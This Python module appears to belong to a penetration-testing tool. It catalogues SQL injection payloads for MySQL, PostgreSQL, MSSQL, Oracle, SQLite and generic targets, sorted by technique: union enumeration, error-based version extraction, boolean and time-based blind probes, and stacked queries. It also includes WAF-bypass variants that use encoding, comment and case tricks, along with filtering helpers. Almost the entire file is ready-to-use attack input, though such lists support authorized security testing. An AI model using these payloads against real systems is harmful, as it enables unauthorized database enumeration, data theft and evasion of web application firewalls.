"""
SQL Payloads - DB-specific SQLi payloads with WAF bypass variants.

Provides payloads categorized by database type and injection technique.
Adapted from Zen-Ai-Pentest DB-aware vulnerability payloads.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import List, Optional


@dataclass
class SQLPayload:
    """A single SQL injection payload."""
    payload: str
    db_type: str            # mysql, postgresql, mssql, oracle, sqlite, generic
    technique: str          # union, error_based, blind_boolean, blind_time, stacked
    description: str
    waf_bypass: bool = False
    risk_indicator: str = "sqli"


# ---------------------------------------------------------------------------
# Database types and techniques
# ---------------------------------------------------------------------------

ALL_DB_TYPES = ["mysql", "postgresql", "mssql", "oracle", "sqlite", "generic"]
ALL_TECHNIQUES = ["union", "error_based", "blind_boolean", "blind_time", "stacked"]


def get_all_db_types() -> List[str]:
    return list(ALL_DB_TYPES)


def get_all_techniques() -> List[str]:
    return list(ALL_TECHNIQUES)


# ---------------------------------------------------------------------------
# MySQL payloads
# ---------------------------------------------------------------------------

_MYSQL_PAYLOADS = [
    # Union
    SQLPayload("' UNION SELECT NULL,NULL,NULL-- -", "mysql", "union", "MySQL union null probe"),
    SQLPayload("' UNION SELECT 1,@@version,3-- -", "mysql", "union", "MySQL version via union"),
    SQLPayload("' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -", "mysql", "union", "MySQL table enumeration"),
    SQLPayload("' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -", "mysql", "union", "MySQL column enumeration"),
    # Error-based
    SQLPayload("' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "mysql", "error_based", "MySQL error-based version extraction"),
    SQLPayload("' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- -", "mysql", "error_based", "MySQL extractvalue error"),
    SQLPayload("' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)-- -", "mysql", "error_based", "MySQL updatexml error"),
    # Blind boolean
    SQLPayload("' AND 1=1-- -", "mysql", "blind_boolean", "MySQL blind true condition"),
    SQLPayload("' AND 1=2-- -", "mysql", "blind_boolean", "MySQL blind false condition"),
    SQLPayload("' AND SUBSTRING(@@version,1,1)='5'-- -", "mysql", "blind_boolean", "MySQL blind version check"),
    # Blind time
    SQLPayload("' AND SLEEP(3)-- -", "mysql", "blind_time", "MySQL time-based blind (SLEEP)"),
    SQLPayload("' AND BENCHMARK(5000000,SHA1('test'))-- -", "mysql", "blind_time", "MySQL time-based blind (BENCHMARK)"),
    SQLPayload("' AND IF(1=1,SLEEP(3),0)-- -", "mysql", "blind_time", "MySQL conditional time-based"),
    # Stacked
    SQLPayload("'; SELECT @@version-- -", "mysql", "stacked", "MySQL stacked query version"),
    # WAF bypass
    SQLPayload("' /*!50000UNION*/ /*!50000SELECT*/ NULL,@@version,NULL-- -", "mysql", "union", "MySQL version comment bypass", waf_bypass=True),
    SQLPayload("' Un%49oN SeLeCt 1,@@version,3-- -", "mysql", "union", "MySQL case + URL encode bypass", waf_bypass=True),
    SQLPayload("' UNION%0aSELECT%0a1,@@version,3-- -", "mysql", "union", "MySQL newline bypass", waf_bypass=True),
]

# ---------------------------------------------------------------------------
# PostgreSQL payloads
# ---------------------------------------------------------------------------

_POSTGRESQL_PAYLOADS = [
    # Union
    SQLPayload("' UNION SELECT NULL,NULL,NULL--", "postgresql", "union", "PostgreSQL union null probe"),
    SQLPayload("' UNION SELECT 1,version(),3--", "postgresql", "union", "PostgreSQL version via union"),
    SQLPayload("' UNION SELECT 1,table_name,3 FROM information_schema.tables--", "postgresql", "union", "PostgreSQL table enumeration"),
    # Error-based
    SQLPayload("' AND 1=CAST(version() AS INT)--", "postgresql", "error_based", "PostgreSQL cast error version"),
    SQLPayload("'||(SELECT ''||version())--", "postgresql", "error_based", "PostgreSQL concat version"),
    # Blind boolean
    SQLPayload("' AND 1=1--", "postgresql", "blind_boolean", "PostgreSQL blind true"),
    SQLPayload("' AND 1=2--", "postgresql", "blind_boolean", "PostgreSQL blind false"),
    SQLPayload("' AND SUBSTRING(version(),1,10)='PostgreSQL'--", "postgresql", "blind_boolean", "PostgreSQL blind version prefix"),
    # Blind time
    SQLPayload("' AND pg_sleep(3)--", "postgresql", "blind_time", "PostgreSQL time-based (pg_sleep)"),
    SQLPayload("'; SELECT pg_sleep(3)--", "postgresql", "blind_time", "PostgreSQL stacked pg_sleep"),
    SQLPayload("' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(3) ELSE pg_sleep(0) END)--", "postgresql", "blind_time", "PostgreSQL conditional time-based"),
    # Stacked
    SQLPayload("'; SELECT version()--", "postgresql", "stacked", "PostgreSQL stacked version"),
    # WAF bypass
    SQLPayload("' UNION/**/SELECT/**/NULL,version(),NULL--", "postgresql", "union", "PostgreSQL comment bypass", waf_bypass=True),
    SQLPayload("$$' UNION SELECT NULL,version(),NULL--$$", "postgresql", "union", "PostgreSQL dollar-quote bypass", waf_bypass=True),
    SQLPayload("' UNION SELECT NULL,version()::text,NULL--", "postgresql", "union", "PostgreSQL cast bypass", waf_bypass=True),
]

# ---------------------------------------------------------------------------
# MSSQL payloads
# ---------------------------------------------------------------------------

_MSSQL_PAYLOADS = [
    # Union
    SQLPayload("' UNION SELECT NULL,NULL,NULL--", "mssql", "union", "MSSQL union null probe"),
    SQLPayload("' UNION SELECT 1,@@version,3--", "mssql", "union", "MSSQL version via union"),
    SQLPayload("' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--", "mssql", "union", "MSSQL table enumeration"),
    # Error-based
    SQLPayload("' AND 1=CONVERT(INT,@@version)--", "mssql", "error_based", "MSSQL convert error version"),
    SQLPayload("' AND 1=CAST(@@version AS INT)--", "mssql", "error_based", "MSSQL cast error version"),
    # Blind boolean
    SQLPayload("' AND 1=1--", "mssql", "blind_boolean", "MSSQL blind true"),
    SQLPayload("' AND 1=2--", "mssql", "blind_boolean", "MSSQL blind false"),
    SQLPayload("' AND SUBSTRING(@@version,1,1)='M'--", "mssql", "blind_boolean", "MSSQL blind version check"),
    # Blind time
    SQLPayload("'; WAITFOR DELAY '0:0:3'--", "mssql", "blind_time", "MSSQL time-based (WAITFOR)"),
    SQLPayload("' AND IF(1=1,WAITFOR DELAY '0:0:3',0)--", "mssql", "blind_time", "MSSQL conditional waitfor"),
    # Stacked
    SQLPayload("'; SELECT @@version--", "mssql", "stacked", "MSSQL stacked version"),
    SQLPayload("'; SELECT name FROM sysobjects WHERE xtype='U'--", "mssql", "stacked", "MSSQL stacked table enum"),
    # WAF bypass
    SQLPayload("' UNION%09SELECT%09NULL,@@version,NULL--", "mssql", "union", "MSSQL tab bypass", waf_bypass=True),
    SQLPayload("' uNiOn sElEcT NULL,@@version,NULL--", "mssql", "union", "MSSQL case alternation bypass", waf_bypass=True),
    SQLPayload("'%2b(SELECT%2b@@version)%2b'", "mssql", "error_based", "MSSQL double URL encode bypass", waf_bypass=True),
]

# ---------------------------------------------------------------------------
# Oracle payloads
# ---------------------------------------------------------------------------

_ORACLE_PAYLOADS = [
    # Union
    SQLPayload("' UNION SELECT NULL,NULL,NULL FROM dual--", "oracle", "union", "Oracle union null probe"),
    SQLPayload("' UNION SELECT NULL,banner,NULL FROM v$version WHERE ROWNUM=1--", "oracle", "union", "Oracle version via union"),
    SQLPayload("' UNION SELECT NULL,table_name,NULL FROM all_tables WHERE ROWNUM<=10--", "oracle", "union", "Oracle table enumeration"),
    # Error-based
    SQLPayload("' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--", "oracle", "error_based", "Oracle UTL_INADDR error"),
    SQLPayload("' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--", "oracle", "error_based", "Oracle CTXSYS error"),
    # Blind boolean
    SQLPayload("' AND 1=1--", "oracle", "blind_boolean", "Oracle blind true"),
    SQLPayload("' AND 1=2--", "oracle", "blind_boolean", "Oracle blind false"),
    SQLPayload("' AND SUBSTR(banner,1,6)='Oracle' FROM v$version WHERE ROWNUM=1--", "oracle", "blind_boolean", "Oracle blind version check"),
    # Blind time
    SQLPayload("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',3)=1--", "oracle", "blind_time", "Oracle time-based (DBMS_PIPE)"),
    SQLPayload("' AND 1=(SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',3) ELSE 1 END FROM dual)--", "oracle", "blind_time", "Oracle conditional time-based"),
    # WAF bypass
    SQLPayload("' UNION/**/SELECT/**/NULL,banner,NULL/**/FROM/**/v$version/**/WHERE/**/ROWNUM=1--", "oracle", "union", "Oracle comment bypass", waf_bypass=True),
    SQLPayload("' UNION SELECT NULL,banner,NULL FROM v$version WHERE ROWNUM=1--/*", "oracle", "union", "Oracle inline comment bypass", waf_bypass=True),
]

# ---------------------------------------------------------------------------
# SQLite payloads
# ---------------------------------------------------------------------------

_SQLITE_PAYLOADS = [
    # Union
    SQLPayload("' UNION SELECT NULL,NULL,NULL--", "sqlite", "union", "SQLite union null probe"),
    SQLPayload("' UNION SELECT 1,sqlite_version(),3--", "sqlite", "union", "SQLite version via union"),
    SQLPayload("' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'--", "sqlite", "union", "SQLite table enumeration"),
    SQLPayload("' UNION SELECT 1,sql,3 FROM sqlite_master--", "sqlite", "union", "SQLite schema dump"),
    # Error-based
    SQLPayload("' AND TYPEOF(sqlite_version())='text'--", "sqlite", "error_based", "SQLite typeof check"),
    # Blind boolean
    SQLPayload("' AND 1=1--", "sqlite", "blind_boolean", "SQLite blind true"),
    SQLPayload("' AND 1=2--", "sqlite", "blind_boolean", "SQLite blind false"),
    SQLPayload("' AND SUBSTR(sqlite_version(),1,1)='3'--", "sqlite", "blind_boolean", "SQLite blind version check"),
    SQLPayload("' AND (SELECT COUNT(*) FROM sqlite_master)>0--", "sqlite", "blind_boolean", "SQLite blind table count"),
    # Blind time (limited in SQLite - use heavy computation)
    SQLPayload("' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--", "sqlite", "blind_time", "SQLite heavy computation delay"),
    # WAF bypass
    SQLPayload("' UNION/**/SELECT/**/1,sqlite_version(),3--", "sqlite", "union", "SQLite comment bypass", waf_bypass=True),
    SQLPayload("' UNION SELECT 1,sqlite_version()||'',3--", "sqlite", "union", "SQLite concat bypass", waf_bypass=True),
    SQLPayload("' UNION SELECT 1,GLOB('*',sqlite_version()),3--", "sqlite", "union", "SQLite GLOB bypass", waf_bypass=True),
]

# ---------------------------------------------------------------------------
# Generic payloads (DB-agnostic)
# ---------------------------------------------------------------------------

_GENERIC_PAYLOADS = [
    # Union
    SQLPayload("' UNION SELECT NULL--", "generic", "union", "Generic union 1-column"),
    SQLPayload("' UNION SELECT NULL,NULL--", "generic", "union", "Generic union 2-column"),
    SQLPayload("' UNION SELECT NULL,NULL,NULL--", "generic", "union", "Generic union 3-column"),
    SQLPayload("' UNION SELECT NULL,NULL,NULL,NULL--", "generic", "union", "Generic union 4-column"),
    SQLPayload("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "generic", "union", "Generic union 5-column"),
    # Error-based
    SQLPayload("'", "generic", "error_based", "Single quote error probe"),
    SQLPayload("''", "generic", "error_based", "Double single quote"),
    SQLPayload("' AND '1'='1", "generic", "error_based", "String comparison true"),
    SQLPayload("' AND '1'='2", "generic", "error_based", "String comparison false"),
    # Blind boolean
    SQLPayload("' OR 1=1--", "generic", "blind_boolean", "Generic OR true"),
    SQLPayload("' OR 1=2--", "generic", "blind_boolean", "Generic OR false"),
    SQLPayload("' AND 1=1--", "generic", "blind_boolean", "Generic AND true"),
    SQLPayload("' AND 1=2--", "generic", "blind_boolean", "Generic AND false"),
    # Blind time
    SQLPayload("' OR SLEEP(3)--", "generic", "blind_time", "Generic sleep probe"),
    SQLPayload("'; WAITFOR DELAY '0:0:3'--", "generic", "blind_time", "Generic waitfor probe"),
    # Stacked
    SQLPayload("'; SELECT 1--", "generic", "stacked", "Generic stacked query"),
    # WAF bypass (generic)
    SQLPayload("'/**/OR/**/1=1--", "generic", "blind_boolean", "Comment whitespace bypass", waf_bypass=True),
    SQLPayload("' %4fR 1=1--", "generic", "blind_boolean", "Hex OR bypass", waf_bypass=True),
    SQLPayload("'%27%20OR%201=1--", "generic", "blind_boolean", "Double URL encode bypass", waf_bypass=True),
    SQLPayload("' oR 1=1--", "generic", "blind_boolean", "Case alternation bypass", waf_bypass=True),
]


# ---------------------------------------------------------------------------
# All payloads combined
# ---------------------------------------------------------------------------

_ALL_PAYLOADS = {
    "mysql": _MYSQL_PAYLOADS,
    "postgresql": _POSTGRESQL_PAYLOADS,
    "mssql": _MSSQL_PAYLOADS,
    "oracle": _ORACLE_PAYLOADS,
    "sqlite": _SQLITE_PAYLOADS,
    "generic": _GENERIC_PAYLOADS,
}


def get_sql_payloads(
    db_type: str = "generic",
    technique: Optional[str] = None,
) -> List[SQLPayload]:
    """Get SQL injection payloads filtered by database type and technique.

    Parameters
    ----------
    db_type : str
        Database type: mysql, postgresql, mssql, oracle, sqlite, generic.
    technique : str, optional
        Injection technique: union, error_based, blind_boolean, blind_time, stacked.
        If None, returns all techniques for the given db_type.

    Returns
    -------
    list of SQLPayload
    """
    payloads = _ALL_PAYLOADS.get(db_type, _ALL_PAYLOADS["generic"])
    if technique:
        payloads = [p for p in payloads if p.technique == technique]
    return payloads


def get_waf_bypass_payloads(db_type: str = "generic") -> List[SQLPayload]:
    """Get only WAF bypass payloads for a given database type."""
    payloads = _ALL_PAYLOADS.get(db_type, _ALL_PAYLOADS["generic"])
    return [p for p in payloads if p.waf_bypass]


def get_all_payloads_flat() -> List[SQLPayload]:
    """Return all payloads across all database types."""
    result: List[SQLPayload] = []
    for payloads in _ALL_PAYLOADS.values():
        result.extend(payloads)
    return result
